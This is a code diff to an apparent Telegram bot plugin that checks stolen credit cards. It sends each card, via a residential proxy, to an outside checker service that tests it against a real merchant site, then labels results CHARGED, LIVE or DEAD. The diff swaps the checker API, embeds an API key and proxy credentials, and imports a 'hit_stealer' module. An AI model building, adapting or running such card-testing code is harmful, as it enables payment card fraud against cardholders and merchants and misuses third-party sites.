@@ -9,8 +9,7 @@ from plugins.tools.hit_stealer import send_hit_if_approved
 stop_flag = False
 pause_flag = False
 
-API_URL = "https://barryxapi.xyz/str_auth"
-API_KEY = "BRY-HEIQ7-KPWYR-DRU67"
+KILTES_URL = "https://kiltes.lol/str/"
 
 async def gcgenfunc(length=6):
     import random, string
@@ -19,15 +18,6 @@ async def gcgenfunc(length=6):
 def elapsed_time(start):
     elapsed = time.perf_counter() - start
     return int(elapsed // 3600), int((elapsed % 3600) // 60), int(elapsed % 60)
-
-def parse_stripe_response(json_data: dict) -> dict:
-    msg = (json_data.get("message") or "").lower()
-    if "approved" in msg:
-        return {"hits": "CHARGED", "response": json_data.get("message", "")}
-    elif any(k in msg for k in ["insufficient", "not enough", "incorrect_cvc", "cvc", "live", "authentication"]):
-        return {"hits": "LIVE", "response": json_data.get("message", "")}
-    else:
-        return {"hits": "DEAD", "response": json_data.get("message", "")}
 
 async def save_cc(result, file_name):
     try:
@@ -73,7 +63,7 @@ async def get_ui(client, msg, total, key, chk_done, charged, live, start):
         f"<b>Live:</b> {live}\n"
         f"<b>Dead:</b> {chk_done - charged - live}\n"
         f"<b>Time:</b> {h}h {m}m {s}s\n"
-        f"<b>Key:</b> <code>{key}</code>",
+        f"<b>Session:</b> <code>{key}</code>",
         reply_markup=reply_markup
     )
 
@@ -87,16 +77,29 @@ async def get_done(client, msg, total, key, hitsfile, chk_done, charged, live, s
         f"<b>Live:</b> {live}\n"
         f"<b>Dead:</b> {chk_done - charged - live}\n"
         f"<b>Time:</b> {h}h {m}m {s}s\n"
-        f"<b>Key:</b> <code>{key}</code>"
+        f"<b>Session:</b> <code>{key}</code>"
     )
     await msg.reply_document(document=hitsfile, caption=caption, quote=True)
 
 async def check_stripe(card, user_id, session):
     try:
-        r = await session.get(API_URL, params={"key": API_KEY, "card": card})
+        params = {
+            "cc": card,
+            "proxy": "proxy.proxiware.com:1337:user-default-network-res-country-us:OedbOv0g3JOQ",
+            "site": "https://www.tekkabazzar.com"
+        }
+        r = await session.get(KILTES_URL, params=params)
         res = r.json()
-        parsed = parse_stripe_response(res)
-        return {"hits": parsed["hits"], "fullz": card, "response": parsed["response"]}
+        msg = (res.get("result") or res.get("message") or res.get("error") or str(res)).lower()
+
+        if any(x in msg for x in ["charged", "payment method added", "thank you"]):
+            return {"hits": "CHARGED", "fullz": card, "response": msg}
+        elif any(x in msg for x in ["insufficient", "zip", "cvc", "avs"]):
+            return {"hits": "LIVE", "fullz": card, "response": msg}
+        elif any(x in msg for x in ["timeout", "rate limit", "proxy error", "connection refused"]):
+            return {"hits": "DEAD", "fullz": card, "response": "Request Timeout"}
+        else:
+            return {"hits": "DEAD", "fullz": card, "response": msg}
     except Exception as e:
         return {"hits": "DEAD", "fullz": card, "response": str(e)}
 
